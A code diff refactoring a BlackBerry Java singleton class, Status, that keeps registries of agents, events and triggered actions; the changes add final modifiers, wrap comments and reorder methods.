@@ -13,7 +13,6 @@ import java.util.Vector;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.IntHashtable;
-
 import blackberry.action.Action;
 import blackberry.agent.Agent;
 import blackberry.event.Event;
@@ -51,14 +50,18 @@ public final class Status implements Singleton {
 
     /**
      * Gets the single instance of Status.
-     * http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/348583/800332/832062/How_to_-_Create_a_singleton_using_the_RuntimeStore.html?nodeid=1461424&vernum=0
+     * http://www.blackberry.com/knowledgecenterpublic
+     * /livelink.exe/fetch/2000/348583
+     * /800332/832062/How_to_-_Create_a_singleton_using_the_RuntimeStore
+     * .html?nodeid=1461424&vernum=0
+     * 
      * @return single instance of Status
      */
     public static synchronized Status getInstance() {
         if (instance == null) {
             instance = (Status) RuntimeStore.getRuntimeStore().get(GUID);
             if (instance == null) {
-                Status singleton = new Status();
+                final Status singleton = new Status();
 
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
@@ -71,6 +74,8 @@ public final class Status implements Singleton {
 
     /** The crisis. */
     private boolean crisis = false;
+
+    IntHashtable triggeredAction = new IntHashtable();
 
     /**
      * Instantiates a new status.
@@ -88,7 +93,7 @@ public final class Status implements Singleton {
      * @param action
      *            the action
      */
-    public synchronized void addAction(Action action) {
+    public synchronized void addAction(final Action action) {
 
         // #ifdef DBC
         Check.requires(actions != null, "Null actions");
@@ -108,12 +113,24 @@ public final class Status implements Singleton {
     }
 
     /**
+     * Adds the action triggered.
+     * 
+     * @param action
+     *            the action
+     */
+    public synchronized void addActionTriggered(final Action action) {
+        if (!triggeredAction.containsKey(action.actionId)) {
+            triggeredAction.put(action.actionId, action);
+        }
+    }
+
+    /**
      * Adds the agent.
      * 
      * @param agent
      *            the agent
      */
-    public synchronized void addAgent(Agent agent) {
+    public synchronized void addAgent(final Agent agent) {
         if (agent == null) {
             // #debug
             debug.error("Status.java - AddAgent NULL");
@@ -148,7 +165,7 @@ public final class Status implements Singleton {
      * @param event
      *            the event
      */
-    public synchronized void addEvent(int eventId_, Event event) {
+    public synchronized void addEvent(final int eventId_, final Event event) {
 
         // #ifdef DBC
         Check.requires(events != null, "Null Events");
@@ -174,7 +191,7 @@ public final class Status implements Singleton {
      * @param parameter
      *            the parameter
      */
-    public synchronized void addParameter(Parameter parameter) {
+    public synchronized void addParameter(final Parameter parameter) {
         // #ifdef DBC
         Check.requires(parameters != null, "Null parameters");
         Check.requires(parameter != null, "Null parameter");
@@ -213,10 +230,10 @@ public final class Status implements Singleton {
      */
     public synchronized int countEnabledAgents() {
         int enabled = 0;
-        Enumeration e = agents.elements();
+        final Enumeration e = agents.elements();
 
         while (e.hasMoreElements()) {
-            Agent agent = (Agent) e.nextElement();
+            final Agent agent = (Agent) e.nextElement();
 
             if (agent.isEnabled()) {
                 enabled++;
@@ -237,6 +254,43 @@ public final class Status implements Singleton {
     }
 
     /**
+     * Gets the action.
+     * 
+     * @param id
+     *            the id
+     * @return the action
+     */
+    public synchronized Action getAction(final int id) {
+        if (actions.containsKey(id)) {
+            final Action action = (Action) actions.get(id);
+
+            // #ifdef DBC
+            Check.ensures(action.actionId == id, "not equal actionId");
+            // #endif
+            return action;
+        } else {
+            // #debug
+            debug.trace("actions don't contain type " + id);
+            return null;
+        }
+    }
+
+    /**
+     * Gets the action id triggered.
+     * 
+     * @return the action id triggered
+     */
+    public synchronized int[] getActionIdTriggered() {
+        final int size = triggeredAction.size();
+        final int[] keys = new int[size];
+        if (size > 0) {
+            triggeredAction.keysToArray(keys);
+        }
+        return keys;
+
+    }
+
+    /**
      * Gets the actions list.
      * 
      * @return the vector
@@ -246,8 +300,8 @@ public final class Status implements Singleton {
         Check.requires(actions != null, "Null actions");
         // #endif
 
-        Enumeration e = actions.elements();
-        Vector vect = new Vector();
+        final Enumeration e = actions.elements();
+        final Vector vect = new Vector();
 
         while (e.hasMoreElements()) {
             vect.addElement(e.nextElement());
@@ -261,21 +315,6 @@ public final class Status implements Singleton {
         return vect;
     }
 
-    public synchronized Action getAction(int Id) {
-        if (actions.containsKey(Id)) {
-            Action action = (Action) actions.get(Id);
-
-            // #ifdef DBC
-            Check.ensures(action.actionId == Id, "not equal actionId");
-            // #endif
-            return action;
-        } else {
-            // #debug
-            debug.trace("actions don't contain type " + Id);
-            return null;
-        }
-    }
-
     /**
      * Gets the agent.
      * 
@@ -283,9 +322,9 @@ public final class Status implements Singleton {
      *            the agent id
      * @return the agent
      */
-    public synchronized Agent getAgent(int agentId) {
+    public synchronized Agent getAgent(final int agentId) {
         if (agents.containsKey(agentId)) {
-            Agent agent = (Agent) agents.get(agentId);
+            final Agent agent = (Agent) agents.get(agentId);
 
             // #ifdef DBC
             Check.ensures(agent.agentId == agentId, "not equal agentId");
@@ -308,8 +347,8 @@ public final class Status implements Singleton {
         Check.requires(agents != null, "Null Agents");
         // #endif
 
-        Enumeration e = agents.elements();
-        Vector vect = new Vector();
+        final Enumeration e = agents.elements();
+        final Vector vect = new Vector();
 
         while (e.hasMoreElements()) {
             vect.addElement(e.nextElement());
@@ -328,9 +367,9 @@ public final class Status implements Singleton {
      *            the event id
      * @return the event
      */
-    public synchronized Event getEvent(int eventId) {
+    public synchronized Event getEvent(final int eventId) {
         if (events.containsKey(eventId)) {
-            Event event = (Event) events.get(eventId);
+            final Event event = (Event) events.get(eventId);
 
             // #ifdef DBC
             Check.ensures(event.eventId == eventId, "not equal eventId");
@@ -353,8 +392,8 @@ public final class Status implements Singleton {
         Check.requires(events != null, "Null Events");
         // #endif
 
-        Enumeration e = events.elements();
-        Vector vect = new Vector();
+        final Enumeration e = events.elements();
+        final Vector vect = new Vector();
 
         while (e.hasMoreElements()) {
             vect.addElement(e.nextElement());
@@ -376,8 +415,8 @@ public final class Status implements Singleton {
         Check.requires(parameters != null, "Null parameters");
         // #endif
 
-        Enumeration e = parameters.elements();
-        Vector vect = new Vector();
+        final Enumeration e = parameters.elements();
+        final Vector vect = new Vector();
 
         while (e.hasMoreElements()) {
             vect.addElement(e.nextElement());
@@ -398,7 +437,7 @@ public final class Status implements Singleton {
      *            the agent id
      * @return true, if is valid agent
      */
-    public synchronized boolean isValidAgent(int agentId) {
+    public synchronized boolean isValidAgent(final int agentId) {
         return agents.containsKey(agentId);
     }
 
@@ -409,7 +448,7 @@ public final class Status implements Singleton {
      *            the event id
      * @return true, if is valid event
      */
-    public synchronized boolean isValidEvent(int eventId) {
+    public synchronized boolean isValidEvent(final int eventId) {
         return events.containsKey(eventId);
     }
 
@@ -420,10 +459,10 @@ public final class Status implements Singleton {
      *            the agent id
      * @return true, if successful
      */
-    public synchronized boolean reEnableAgent(int agentId) {
-        Agent agent = getAgent(agentId);
+    public synchronized boolean reEnableAgent(final int agentId) {
+        final Agent agent = getAgent(agentId);
 
-        if (agent == null ) {
+        if (agent == null) {
             // #debug
             debug.error("cannot renable agent " + agent);
             return false;
@@ -441,14 +480,26 @@ public final class Status implements Singleton {
      * @return true, if successful
      */
     public synchronized boolean reEnableAgents() {
-        Enumeration e = agents.elements();
+        final Enumeration e = agents.elements();
 
         while (e.hasMoreElements()) {
-            Agent agent = (Agent) e.nextElement();
+            final Agent agent = (Agent) e.nextElement();
             reEnableAgent(agent.agentId);
         }
 
         return true;
+    }
+
+    /**
+     * Removes the action triggered.
+     * 
+     * @param action
+     *            the action
+     */
+    public synchronized void removeActionTriggered(final Action action) {
+        if (triggeredAction.containsKey(action.actionId)) {
+            triggeredAction.remove(action.actionId);
+        }
     }
 
     /**
@@ -471,14 +522,16 @@ public final class Status implements Singleton {
      * @param actionId
      *            the action id
      * @param event
+     *            the event
      * @return true, if successful
      */
-    public synchronized boolean triggerAction(int actionId, Event event) {
+    public synchronized boolean triggerAction(final int actionId,
+            final Event event) {
         // #debug
         debug.trace("TriggerAction:" + actionId);
 
         if (actions.containsKey(actionId)) {
-            Action action = (Action) actions.get(actionId);
+            final Action action = (Action) actions.get(actionId);
             action.setTriggered(true, event);
             return true;
         } else {
@@ -486,30 +539,6 @@ public final class Status implements Singleton {
             debug.error("TriggerAction FAILED " + actionId);
             return false;
         }
-    }
-
-    IntHashtable triggeredAction = new IntHashtable();
-
-    public synchronized void addActionTriggered(Action action) {
-        if (!triggeredAction.containsKey(action.actionId)) {
-            triggeredAction.put(action.actionId, action);
-        }
-    }
-
-    public synchronized void removeActionTriggered(Action action) {
-        if (triggeredAction.containsKey(action.actionId)) {
-            triggeredAction.remove(action.actionId);
-        }
-    }
-
-    public synchronized int[] getActionIdTriggered() {
-        int size = triggeredAction.size();
-        int[] keys = new int[size];
-        if (size > 0) {
-            triggeredAction.keysToArray(keys);
-        }
-        return keys;
-
     }
 
 }
